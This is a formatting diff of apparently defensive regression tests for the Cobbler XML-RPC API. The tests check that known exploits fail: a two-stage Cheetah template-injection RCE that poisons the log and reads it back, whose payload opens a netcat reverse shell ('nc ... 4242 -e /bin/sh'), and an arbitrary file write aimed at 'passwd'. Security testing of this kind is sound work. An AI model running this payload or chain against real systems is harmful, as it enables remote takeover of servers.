@@ -26,6 +26,7 @@ def try_connect():
     def try_connect(url) -> xmlrpc.client.ServerProxy:
         xmlrpc_server = xmlrpc.client.ServerProxy(url)
         return xmlrpc_server
+
     return try_connect
 
 
@@ -76,7 +77,7 @@ def test_arbitrary_file_disclosure_1(setup_profile, try_connect):
 
 def test_template_injection_1(setup_profile, try_connect):
     # Arrange
-    exploitcode = '__import__(\'os\').system(\'nc [tnpitsecurity] 4242 -e /bin/sh\')'
+    exploitcode = "__import__('os').system('nc [tnpitsecurity] 4242 -e /bin/sh')"
     cobbler_api = try_connect("http://localhost/cobbler_api")
 
     # Act
@@ -84,9 +85,13 @@ def test_template_injection_1(setup_profile, try_connect):
     target = profiles[0]["name"]
     try:
         print("[+] Stage 1 : Poisoning log with Cheetah template RCE")
-        result_stage_1 = cobbler_api.generate_script(target, "", '{<%= ' + exploitcode + ' %>}')
+        result_stage_1 = cobbler_api.generate_script(
+            target, "", "{<%= " + exploitcode + " %>}"
+        )
         print("[+] Stage 2 : Rendering template using an arbitrary file read.")
-        result_stage_2 = cobbler_api.generate_script(target, "", "/var/log/cobbler/cobbler.log")
+        result_stage_2 = cobbler_api.generate_script(
+            target, "", "/var/log/cobbler/cobbler.log"
+        )
 
         # Assert this NOT succeeds
         assert not result_stage_1.startswith("__import__")
@@ -108,11 +113,12 @@ def test_arbitrary_file_write_1(setup_profile, try_connect):
         "passwd",
         len(exploit),
         100000,
-        base64.b64encode(exploit)
+        base64.b64encode(exploit),
     )
 
     # Assert this NOT succeeds
     assert result is False
+
 
 # ==================== END tnpconsultants ====================
 
@@ -136,5 +142,6 @@ def test_pam_login_with_expired_user():
 
     # Assert - Login failed
     assert not result
+
 
 # ==================== END ysf ====================
